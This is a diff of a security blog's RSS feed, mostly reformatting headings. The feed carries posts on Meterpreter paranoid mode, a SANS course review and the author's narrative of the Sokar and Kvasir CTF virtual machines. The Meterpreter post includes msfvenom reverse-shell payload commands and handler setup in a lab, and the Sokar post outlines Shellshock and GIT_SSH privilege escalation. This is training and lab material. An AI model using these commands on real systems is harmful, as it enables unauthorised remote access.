@@ -1,13 +1,26 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Guff on rastamouse.me</title>
-    <link>https://rastamouse.me/categories/guff/</link>
-    <description>Recent content in Guff on rastamouse.me</description>
+    <title>guff on rastamouse.me</title>
+    <link>https://rastamouse.me/categories/guff/index.xml</link>
+    <description>Recent content in guff on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 21 Jul 2015 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/categories/guff/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Pwning Automize Password Encryption</title>
+      <link>https://rastamouse.me/guff/2016/automize/</link>
+      <pubDate>Thu, 15 Dec 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://rastamouse.me/guff/2016/automize/</guid>
+      <description>&lt;p&gt;&lt;/p&gt;
+
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/9Lc2X1RjpZs&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;</description>
+    </item>
     
     <item>
       <title>Paranoid Meterpreter</title>
@@ -15,13 +28,13 @@
       <pubDate>Tue, 21 Jul 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/guff/2015/paranoid-meterpreter/</guid>
-      <description>
+      <description>&lt;p&gt;There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;, entitled &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers&#34;&gt;The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers&lt;/a&gt;. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.&lt;/p&gt;
 
-&lt;p&gt;There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;, entitled &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers&#34;&gt;The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers&lt;/a&gt;. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;Go ahead and check out that post for the gorey details. I was particularly interested in a feature called ‘Paranoid Meterpreter’, which is basically a means of preventing other people from hijacking your juicy, hard earned shells. This post is a simplistic example of how a Meterpreter shell can be hijacked and how this can be prevented. You can also read HD Moore’s original article &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-setup:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;The Setup&lt;/h2&gt;
+&lt;h2 id=&#34;the-setup&#34;&gt;The Setup&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;1 x Windows 7: Victim (192.168.56.102)&lt;/li&gt;
@@ -42,16 +55,16 @@
 
 &lt;p&gt;The two payloads don’t appear all that different in the Metasploit Framework and they appear to functional identically if you are not using any of the differentiating features from the respective APIs.&lt;/p&gt;
 
-&lt;h2 id=&#34;scenario-1-wininet:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Scenario 1: WinInet&lt;/h2&gt;
+&lt;h2 id=&#34;scenario-1-wininet&#34;&gt;Scenario 1: WinInet&lt;/h2&gt;
 
 &lt;p&gt;This is the payload the majority of people will likely be familar with, not least because it has been present in the framework for longer.&lt;/p&gt;
 
-&lt;h3 id=&#34;generate-the-payload:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate the Payload&lt;/h3&gt;
+&lt;h3 id=&#34;generate-the-payload&#34;&gt;Generate the Payload&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_https LHOST=kali LPORT=443 -f exe -o /root/wininet.exe
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;handler-exploit:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
+&lt;h2 id=&#34;handler-exploit&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
 msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_https
@@ -78,17 +91,17 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;The would-be attacker (.101) gets the shell. This is because there is no mutual validation between the stager and the handler.&lt;/p&gt;
 
-&lt;h2 id=&#34;scenario-2-winhttp:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Scenario 2: WinHTTP&lt;/h2&gt;
+&lt;h2 id=&#34;scenario-2-winhttp&#34;&gt;Scenario 2: WinHTTP&lt;/h2&gt;
 
 &lt;p&gt;This API enables Meterpreter to verify the SHA1 hash of the SSL certificate presented by the Framework. This requirement is enforced by both the handler and payload stager.&lt;/p&gt;
 
-&lt;h3 id=&#34;generate-an-ssl-cert:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate an SSL Cert&lt;/h3&gt;
+&lt;h3 id=&#34;generate-an-ssl-cert&#34;&gt;Generate an SSL Cert&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
 cat meterpreter.key meterpreter.crt &amp;gt; meterpreter.pem
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;generate-the-payload-1:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate the Payload&lt;/h2&gt;
+&lt;h2 id=&#34;generate-the-payload-1&#34;&gt;Generate the Payload&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_winhttps LHOST=kali LPORT=443 HandlerSSLCert=meterpreter.pem StagerVerifySSLCert=true -f exe -o winhttps.exe
 
@@ -96,7 +109,7 @@ cat meterpreter.key meterpreter.crt &amp;gt; meterpreter.pem
 [*] Writing 73802 bytes to /root/winhttps.exe...
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;handler-exploit-1:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
+&lt;h2 id=&#34;handler-exploit-1&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
 msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_winhttps
@@ -128,12 +141,11 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;Because the other attacker does not have the SSL cert, they cannot validate themselves to the Stager and the Meterpreter session closes.&lt;/p&gt;
 
-&lt;h2 id=&#34;moar-paranoia:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Moar Paranoia&lt;/h2&gt;
+&lt;h2 id=&#34;moar-paranoia&#34;&gt;Moar Paranoia&lt;/h2&gt;
 
 &lt;p&gt;It’s possible to take this level of paranoia to the next level using UUID validation. In the examples above, we can see that &amp;lsquo;random&amp;rsquo; UUID names are given.  &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID&#34;&gt;More info here&lt;/a&gt;. But payloads can be assigned specific UUIDs using &lt;code&gt;PayloadUUIDTracking=true&lt;/code&gt; and &lt;code&gt;PayloadUUIDName=&amp;lt;name&amp;gt;&lt;/code&gt; parameters.&lt;/p&gt;
 
-&lt;p&gt;The handler can be given the &lt;code&gt;IgnoreUnknownPayloads&lt;/code&gt; true parameter, so that it will only accept stagers with your own whitelisted UUIDs.&lt;/p&gt;
-</description>
+&lt;p&gt;The handler can be given the &lt;code&gt;IgnoreUnknownPayloads&lt;/code&gt; true parameter, so that it will only accept stagers with your own whitelisted UUIDs.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -142,11 +154,11 @@ msf exploit(handler) &amp;gt; run
       <pubDate>Sat, 30 May 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/guff/2015/sans-sec542-course-review/</guid>
-      <description>
+      <description>&lt;p&gt;As some may be aware, in January 2015 I started the SANS &amp;lsquo;&lt;a href=&#34;http://www.sans.org/selfstudy/course/web-app-penetration-testing-ethical-hacking&#34;&gt;SEC542: Web App Penetration Testing and Ethical Hacking&lt;/a&gt;&amp;rsquo; SelfStudy course.  I passed the GWAPT (GIAC Web Application Penetration Tester) certification at the end of May; so I figured I would write up a review of the course and summerise my experience.&lt;/p&gt;
 
-&lt;p&gt;As some may be aware, in January 2015 I started the SANS &amp;lsquo;&lt;a href=&#34;http://www.sans.org/selfstudy/course/web-app-penetration-testing-ethical-hacking&#34;&gt;SEC542: Web App Penetration Testing and Ethical Hacking&lt;/a&gt;&amp;rsquo; SelfStudy course.  I passed the GWAPT (GIAC Web Application Penetration Tester) certification at the end of May; so I figured I would write up a review of the course and summerise my experience.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;course-syllabus:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;Course Syllabus&lt;/h2&gt;
+&lt;h2 id=&#34;course-syllabus&#34;&gt;Course Syllabus&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;The Attacker&amp;rsquo;s View of the Web&lt;/li&gt;
@@ -159,7 +171,7 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;SEC542 was designed to be delivered in the traditional classroom style, over the period of 6 days.  Each syllabus area is covered in roughly 1 day.&lt;/p&gt;
 
-&lt;h2 id=&#34;course-material:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;Course Material&lt;/h2&gt;
+&lt;h2 id=&#34;course-material&#34;&gt;Course Material&lt;/h2&gt;
 
 &lt;p&gt;The course material is covered with a number of different mediums.  The SelfStudy student receives:&lt;/p&gt;
 
@@ -180,7 +192,7 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;This whole setup works ok for the most part, as you could transfer everything to a laptop and do bits of the course &amp;lsquo;offline&amp;rsquo;, which some people may find convenient.  However, I did experience a few niggly issues.  There appears to be a few instances where the slides/audio vary from the exercise on the VM, as if the material has been updated but the VM hasn&amp;rsquo;t.  For me, this led to a few situations where some of the exercises weren&amp;rsquo;t working as expected; and because you can&amp;rsquo;t &amp;lsquo;see&amp;rsquo; what the instructor is doing it obviously makes it hard for you to confirm what you are doing is correct.&lt;/p&gt;
 
-&lt;h2 id=&#34;topics:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;Topics&lt;/h2&gt;
+&lt;h2 id=&#34;topics&#34;&gt;Topics&lt;/h2&gt;
 
 &lt;p&gt;The syllabus areas above are rather broad statements, so which topics are actually covered?  Well, a lot&amp;hellip; To list the major ones:&lt;/p&gt;
 
@@ -200,11 +212,11 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;This is a &lt;em&gt;lot&lt;/em&gt; of information to digest, so you may not be surprised to hear that SEC542 is not designed to cover any of these areas in any serious depth.  It is certainly more of an entry level course.&lt;/p&gt;
 
-&lt;h2 id=&#34;capture-the-flag:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;Capture the Flag&lt;/h2&gt;
+&lt;h2 id=&#34;capture-the-flag&#34;&gt;Capture the Flag&lt;/h2&gt;
 
 &lt;p&gt;You can connect to the lab via VPN at any time during your 4 months of access, where you can practice all of the techniques covered in the course.  It&amp;rsquo;s more of a consolidatory exercise in my eyes, rather than a necessity of the course.  How much benefit you gain from it is going to be personal to you.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-exam:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;The Exam&lt;/h2&gt;
+&lt;h2 id=&#34;the-exam&#34;&gt;The Exam&lt;/h2&gt;
 
 &lt;p&gt;The GIAC Certification attempt is an optional extra when purchasing SEC542, so you can take the course and not attempt the certification if you wish.  The exam for the GIAC Silver Certification is a multiple choice test, where you must travel to a proctored test centre to complete.&lt;/p&gt;
 
@@ -218,10 +230,9 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;This actually makes the exam sound really easy, but there is a level of comprehension required as the information from the course can&amp;rsquo;t just be lifted and applied to the exam questions.&lt;/p&gt;
 
-&lt;h2 id=&#34;giac-gold:47501a26d997bbf1752d1f0ff59bfc19&#34;&gt;GIAC Gold&lt;/h2&gt;
+&lt;h2 id=&#34;giac-gold&#34;&gt;GIAC Gold&lt;/h2&gt;
 
-&lt;p&gt;Passing the exam gives you a &amp;lsquo;silver&amp;rsquo; certification, but if you fork over another ~$600 to SANS you can attempt the &amp;lsquo;gold&amp;rsquo; certification.  This involves writing a paper/technical report with guidance from a SANS Advisor which will then be published in their &lt;a href=&#34;http://www.sans.org/reading-room&#34;&gt;Reading Room&lt;/a&gt;.&lt;/p&gt;
-</description>
+&lt;p&gt;Passing the exam gives you a &amp;lsquo;silver&amp;rsquo; certification, but if you fork over another ~$600 to SANS you can attempt the &amp;lsquo;gold&amp;rsquo; certification.  This involves writing a paper/technical report with guidance from a SANS Advisor which will then be published in their &lt;a href=&#34;http://www.sans.org/reading-room&#34;&gt;Reading Room&lt;/a&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -230,13 +241,13 @@ msf exploit(handler) &amp;gt; run
       <pubDate>Sat, 21 Feb 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/guff/2015/sokar-authors-narrative/</guid>
-      <description>
-
-&lt;p&gt;At the very moment I am typing this, ~4 hours remain on the countdown clock for &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;VulnHub&amp;rsquo;s Sokar Competition&lt;/a&gt;.  We have also received about 17 complete write-ups, which I&amp;rsquo;m really pleased with.&lt;/p&gt;
+      <description>&lt;p&gt;At the very moment I am typing this, ~4 hours remain on the countdown clock for &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;VulnHub&amp;rsquo;s Sokar Competition&lt;/a&gt;.  We have also received about 17 complete write-ups, which I&amp;rsquo;m really pleased with.&lt;/p&gt;
 
 &lt;p&gt;Now, Sokar was never originally designed to be released on VulnHub, let alone feature as a birthday competition.  So this post serves to outline Sokar&amp;rsquo;s origin story, the intended exploitation path and anything else I can think to talk about.&lt;/p&gt;
 
-&lt;h2 id=&#34;origin:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;Origin&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;origin&#34;&gt;Origin&lt;/h2&gt;
 
 &lt;p&gt;On September 24th, the &lt;a href=&#34;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&#34;&gt;Shellshock&lt;/a&gt; vulnerability was disclosed, which understandably, caused a raft of emergency response across businesses.  After we had carried out the necessary patching across our cloud platform, we wanted to go back over all of the server logs to ensure we had not been attacked prior to disclosure.&lt;/p&gt;
 
@@ -246,7 +257,7 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;I suppose he found the experience devilsh enough to suggest I make it available on VulnHub&amp;hellip;&lt;/p&gt;
 
-&lt;h2 id=&#34;the-birthday:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;The Birthday&lt;/h2&gt;
+&lt;h2 id=&#34;the-birthday&#34;&gt;The Birthday&lt;/h2&gt;
 
 &lt;p&gt;I was in no rush to get Sokar (still lacking it&amp;rsquo;s official name) ready for release on VulnHub, but word that I had a VM &amp;lsquo;in development&amp;rsquo; made it to &lt;a href=&#34;https://twitter.com/g0tmi1k&#34;&gt;g0tmi1k&amp;rsquo;s&lt;/a&gt; ears.  He asked if I would like to use this VM as VulnHub&amp;rsquo;s birthday competition.&lt;/p&gt;
 
@@ -254,11 +265,11 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;Barrebas was obviously first in the firing line for beta-testing, after all, this was his fault ;).  &lt;a href=&#34;https://twitter.com/thecolonial&#34;&gt;TheColonial&lt;/a&gt; also gracefully stepped up to the plate.&lt;/p&gt;
 
-&lt;h2 id=&#34;walkthrough:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;Walkthrough&lt;/h2&gt;
+&lt;h2 id=&#34;walkthrough&#34;&gt;Walkthrough&lt;/h2&gt;
 
 &lt;p&gt;As you will see from the write-ups, there are a bunch of different solutions to Sokar - every stage has an alternate method of exploitation.  Here is my summary of how I designed Sokar to be beaten, and a few words on the alternates.&lt;/p&gt;
 
-&lt;h3 id=&#34;shellshock:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;Shellshock&lt;/h3&gt;
+&lt;h3 id=&#34;shellshock&#34;&gt;Shellshock&lt;/h3&gt;
 
 &lt;p&gt;I kept Shellshock as the initial exploitation point, which allowed interaction with the local filesystem.  Using this access, the attacker will find the following information:&lt;/p&gt;
 
@@ -330,7 +341,7 @@ outbound ephemeral port access on 51242
 
 &lt;p&gt;Keeping IPv6 enabled was a slip-up on my part.  But it sure as hell goes to show what a risk it can be if left running and not managed correctly.  Finally, Shellshock also allowed for some other attacks, which took you straight to root - most notable being against DHCP.&lt;/p&gt;
 
-&lt;h3 id=&#34;lime:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;LiME&lt;/h3&gt;
+&lt;h3 id=&#34;lime&#34;&gt;LiME&lt;/h3&gt;
 
 &lt;p&gt;The next step was to perform a memory dump, using the LiME kernel module.  I wrote a bash wrapper around this, as it was easier to integrate it into &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;
 
@@ -396,7 +407,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 &lt;p&gt;To fix the problem properly, I should have hardcoded the path to something like &lt;code&gt;/home/bynarr/ram&lt;/code&gt; and &lt;code&gt;touch /home/bynarr/ram&lt;/code&gt; as root (also ensuring another user could not move it etc).&lt;/p&gt;
 
-&lt;h3 id=&#34;git:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;Git&lt;/h3&gt;
+&lt;h3 id=&#34;git&#34;&gt;Git&lt;/h3&gt;
 
 &lt;p&gt;This &lt;code&gt;build&lt;/code&gt; binary contains an encrypted (XOR&amp;rsquo;d) string, which is decrypted at runtime and passed to &lt;code&gt;system()&lt;/code&gt;.  The command initiates a &lt;code&gt;git clone&lt;/code&gt; over SSH.&lt;/p&gt;
 
@@ -418,12 +429,11 @@ git version 2.2.0
 
 &lt;p&gt;The other, slightly easier route, is to take advantage of the git environmental variables, such as &lt;code&gt;GIT_SSH&lt;/code&gt;.  Export the variable to point at your own shell script, causes this to be run instead of the real ssh, also as root.&lt;/p&gt;
 
-&lt;h2 id=&#34;conclusions:e5cf719596ab6a87a7d7e8601fcbad2c&#34;&gt;Conclusions&lt;/h2&gt;
+&lt;h2 id=&#34;conclusions&#34;&gt;Conclusions&lt;/h2&gt;
 
 &lt;p&gt;It seems Sokar received mostly positive comments, I realise some may have been disappointed with a VM loaded with published vulnerabilities.&lt;/p&gt;
 
-&lt;p&gt;If you have any comments or thoughts to add, please do so people.  Or get in touch with myself or VulnHub on Twitter, IRC or the world wide web.&lt;/p&gt;
-</description>
+&lt;p&gt;If you have any comments or thoughts to add, please do so people.  Or get in touch with myself or VulnHub on Twitter, IRC or the world wide web.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -439,6 +449,8 @@ git version 2.2.0
 &lt;p&gt;I was incredibly lucky and was offered the chance to join the private beta program for testing the Playground; which involved attacking as many of the machines as possible and providing appropriate feedback to Offensive Security.  The intricate details of the lab will obviously remain private, but we were permitted to publish this final review of our experience.&lt;/p&gt;
 
 &lt;p&gt;So without further ado&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -501,8 +513,7 @@ git version 2.2.0
 
 &lt;p&gt;Now, to finish off this waffle, I would like to extend my sincere gratitude to &lt;a href=&#34;https://twitter.com/kalilinux&#34;&gt;muts&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/g0tmi1k&#34;&gt;g0tmi1k&lt;/a&gt; for inviting me to join the beta program; and to &lt;a href=&#34;https://twitter.com/loneferret&#34;&gt;loneferret&lt;/a&gt;, who also put a lot of work in the lab to make our lives a misery!&lt;/p&gt;
 
-&lt;p&gt;Kudos to Offensive Security, you should all be very proud of what you have achieved - now you just need get AWAE online!! :D&lt;/p&gt;
-</description>
+&lt;p&gt;Kudos to Offensive Security, you should all be very proud of what you have achieved - now you just need get AWAE online!! :D&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -511,9 +522,9 @@ git version 2.2.0
       <pubDate>Sun, 16 Nov 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/guff/2014/kvasir-1-follow-up/</guid>
-      <description>
+      <description>&lt;p&gt;It&amp;rsquo;s been about a month since Kvasir I was made available on &lt;a href=&#34;https://www.vulnhub.com/entry/kvasir-i,106/&#34;&gt;VulnHub&lt;/a&gt;, so I thought I would write a follow-up post about it.  In some ways, it was a vulnerable VM which went in a different direction to the ones we are used to.  It was also the first VM I have produced, so I wanted to jot down a few notes about what I thought worked well and what didn&amp;rsquo;t.&lt;/p&gt;
 
-&lt;p&gt;It&amp;rsquo;s been about a month since Kvasir I was made available on &lt;a href=&#34;https://www.vulnhub.com/entry/kvasir-i,106/&#34;&gt;VulnHub&lt;/a&gt;, so I thought I would write a follow-up post about it.  In some ways, it was a vulnerable VM which went in a different direction to the ones we are used to.  It was also the first VM I have produced, so I wanted to jot down a few notes about what I thought worked well and what didn&amp;rsquo;t.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;These are my views, from being its &amp;lsquo;author&amp;rsquo; and from the feedback I&amp;rsquo;ve had from those who have attempted the challenge.  If you disagree or have anything to add, please add a comment below.&lt;/p&gt;
 
@@ -521,7 +532,7 @@ git version 2.2.0
 &lt;p&gt;This post may contain spoilers.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h2 id=&#34;the-good:f600fcc42cc6b1e6b27bbee9bc837ba2&#34;&gt;The Good&lt;/h2&gt;
+&lt;h2 id=&#34;the-good&#34;&gt;The Good&lt;/h2&gt;
 
 &lt;p&gt;I&amp;rsquo;ll start with what I feel were the positives.&lt;/p&gt;
 
@@ -545,7 +556,7 @@ git version 2.2.0
 &lt;p&gt;There was also evidence of users interacting with services and users on the other boxes, which I hope added to this feeling for the player.&lt;/p&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&#34;the-bad-not-so-good:f600fcc42cc6b1e6b27bbee9bc837ba2&#34;&gt;The &lt;del&gt;Bad&lt;/del&gt; Not-so-Good&lt;/h2&gt;
+&lt;h2 id=&#34;the-bad-not-so-good&#34;&gt;The &lt;del&gt;Bad&lt;/del&gt; Not-so-Good&lt;/h2&gt;
 
 &lt;ol&gt;
 &lt;li&gt;&lt;p&gt;The length!  This VM was probably right on the edge of what people&amp;rsquo;s patience and sanity could withstand.  Roughly counting, around 9 exploits are needed before the final flag can be reached - and it&amp;rsquo;s not like all of them were short.&lt;/p&gt;
@@ -561,12 +572,11 @@ git version 2.2.0
 &lt;p&gt;Given the trade-off, I decided it would be better to keep some containers un-rootable (by design anyway).&lt;/p&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&#34;the-ugly:f600fcc42cc6b1e6b27bbee9bc837ba2&#34;&gt;The Ugly&lt;/h2&gt;
+&lt;h2 id=&#34;the-ugly&#34;&gt;The Ugly&lt;/h2&gt;
 
 &lt;p&gt;I don&amp;rsquo;t think, and hopefully the players will agree, that there was nothing about this VM which was truly awful.  I&amp;rsquo;ve not had any stronly negative feedback (maybe you&amp;rsquo;re all too nice).&lt;/p&gt;
 
-&lt;p&gt;If you feel differently - please say so!&lt;/p&gt;
-</description>
+&lt;p&gt;If you feel differently - please say so!&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -577,14 +587,17 @@ git version 2.2.0
       <guid>https://rastamouse.me/guff/2014/kvasir-1-released/</guid>
       <description>&lt;blockquote&gt;
 &lt;p&gt;After the war between the Aesir and Vanir, all the Gods made a truce by spitting into a bowl. They stirred up the mixture and created a new God of Knowledge. His name was Kvasir and he was made the most amazing diplomat to prevent further disagreements.&lt;/p&gt;
+&lt;/blockquote&gt;
 
+&lt;p&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
 &lt;p&gt;Sadly he didn’t last long as he was slaughtered by treacherous dwarves, who drained his blood, mixed it with honey and fermented it into a highly potent mead. This became known as Kvas - the Mead of Inspiration - a fiery brew the colour of beetroot. Drinking it was a highly enlightening experience.&lt;/p&gt;
 
 &lt;p&gt;Can you beat Kvasir, capture the flag and gain enlightenment?&lt;/p&gt;
 
 &lt;p&gt;Get it exclusively from &lt;a href=&#34;https://www.vulnhub.com/entry/kvasir-i,106/&#34;&gt;VulnHub&lt;/a&gt;.&lt;/p&gt;
-&lt;/blockquote&gt;
-</description>
+&lt;/blockquote&gt;</description>
     </item>
     
   </channel>
